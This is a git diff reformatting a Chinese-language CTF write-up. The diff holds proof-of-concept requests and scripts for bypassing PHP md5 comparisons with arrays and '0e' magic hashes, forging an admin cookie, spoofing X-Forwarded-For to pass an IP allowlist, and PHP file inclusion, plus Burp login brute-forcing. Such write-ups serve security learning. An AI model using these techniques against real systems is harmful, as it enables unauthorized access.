@@ -19,8 +19,14 @@ Les1ie写的writeup, 非官方版本
 2017-5-16 23:55:30
 
 ## 0x01 蛤机器人
+
+```
 http://119.29.16.200:5009
+```
+
 打开之后啥也没有，看到title里面说机器人，输入robots.txt, 看到一个.index.php.swp, 下载下来打开，看到网页源代码
+
+
 ```php
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml">
@@ -51,12 +57,15 @@ if ($ha and $s1) {
 代码审计题目, 看得出他是需要接受两个GET参数， `ha` 和 `1s`, `if`的语句表示这两个字符串不能相同，并且md5值相等就会打印出flag的值。
 
 我第一反应是md5碰撞，网上找了下， 在[stack overflow](http://stackoverflow.com/questions/1756004/can-two-different-strings-generate-the-same-md5-hash-code) 找到了一个例子，但是提交却一直不对，于是问了出题人，出题人提示php里面数组是不可哈希的(突然想起来py里面也是这样的)，于是poc如下
-```html
+
+```text
  http://119.29.16.200:5009/?ha[]=123&1s[]=4
 ```
  直接请求如下网址即可。
 
  另外，出题人用我的思路做出来了...把之前的字符串转成bin，然后urlencode请求过去，php的exp如下
+
+
 ```php
 <?php
 $str1 = file_get_contents('1.txt');
@@ -75,14 +84,16 @@ var_dump($html);
 ?>
 ```
 
-#文件是这两个
-(1.txt)(/img/scuctf/1.txt) 以及 (2.txt)[/img/scuctf/2.txt]
+##### 文件是这两个
+[1.txt](/img/scuctf/1.txt) 以及 [2.txt](/img/scuctf/2.txt)
 
 
 我用python没有复现这个东西，用的urllib.urlencode()但是不行，试过了py2和py3都不行，遂放弃。
 
 ## 0x02哈希与科学计数法
 进去就让我们查看源代码，看到有个hidden的1.txt, 打开看又是一个代码审计题目
+
+
 ```php
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml">
@@ -116,6 +127,8 @@ if (strstr($flag,'200')) {
 问了出题人，出题人直接复制了这一个字符串，右键google...醉醉的，我咋没想到直接google这个数字呢
 
 然后看到了这个一个[介绍](http://www.rabbit8.cn/569.html) php的哈希缺陷的，[这个也可以看](https://www.ohlinge.cn/php/0e_md5.html) ，然后页面里面随便选了一个值get提交就ok。 写了个exp如下
+
+
 ```python
 import requests
 
@@ -146,6 +159,8 @@ print r.headers
 打开只有一个登录框，没有验证码提示账号密码都是test, 我猜是出题人怕我们写脚本爆破把服务器搞崩了，这个服务器在学校内网233333。
 
 登录上去提示我们没有管理员权限，看了cookie以及网络请求都没东西，然后我试了试登录框用admin登录，开20个线程用burp爆破，10000的弱口令都没有..gg, 然后爆破的时候服务器500, 关了burp就没事，后来发现cookie是md5(test)的值， 然后把cookie改成md5(admin)就行了，poc如下
+
+
 ```python 
 import requests
 
@@ -167,6 +182,7 @@ u = requests.get(url, cookies=cookie)
 print u.text
 
 ```
+
 请求的页面不能加上login..., 也不需要再次登录，直接带cookie去get请求就出flag了..
 
 ## 0x04 fast
@@ -197,18 +213,24 @@ t = r.post(url+'flag', data=payload)
 print t.url
 print t.text
 ```
+
+
 但是还有个坑，部署他用的uwsgi, 这个针对时间要求特别高的不行，支持很差，第一天没人提交..23333我是第一天晚上才开始做这次的ctf的，那时候还没人提交这道题。
 
 我问题哪里没对么，他说...服务器没对，2333，他重新搞了下，等我回寝室提交的时候就可以了，但是不是一血，有一个人在我之前提交了。
 
 ## 0x05 ip
 打开显示
+
+
 ```html
 您的IP是：121.48.213.217<br>不在允许范围，本系统仅允许202.115.47.141访问
 ```
+
 觉得是学校的服务器的网段，扫了下扫不动，后来才知道这个是教务处的233333333333
 
-搜了下找到改`X-Forwarded-For`头就行了，伪造来源ip, 利用的poc如下
+改`X-Forwarded-For`头就行了，伪造来源ip, 利用的poc如下
+
 ```python
 #! coding:utf-8
 import requests
@@ -240,6 +262,7 @@ print r.text
 逆向题，丢到我32bit的kali的虚拟机没办法运行，拖进od也不行，最后知道这个是64bit的环境才行。
 
 在64bit的服务器里运行如下:
+
 ```bash
 ~  23:23:59
 $ ./babyre 
@@ -247,6 +270,7 @@ welcome to the re world
 ```
 
 拖进64位的ida就行看到明文写的flag了，或者直接暴力的在terminal里面运行，
+
 ```bash
 $ strings babyre 
 .
@@ -259,6 +283,7 @@ welcome to the re world
 .
 .
 ```
+
 直接找到了flag, 
 
 ## 0x07 逆向
@@ -304,6 +329,7 @@ int main(int argc, char *argv[]) {
 }
 root@localhost:~/ctf# 
 ```
+
 试了下该用户没有对该目录没有写权限，对flag文件没有r权限，对二进制文件有x权限，只能通过二进制文件去打印flag内容
 
 源码的意思是调用二进制文件的时候传参数，长度为20的字符串，字符串4位作为一个整体，拆成五个部分，加起来等于0x21DD09ED就行。
@@ -327,9 +353,12 @@ root@localhost:~/ctf#
 
 这个是php文件包含，
 大概就是
+
 ```
 http://xxx.xx/index?index=xxxxxx
 ```
+
+
 没有对xxx进行限制，然后就直接利用他执行命令了
 
 
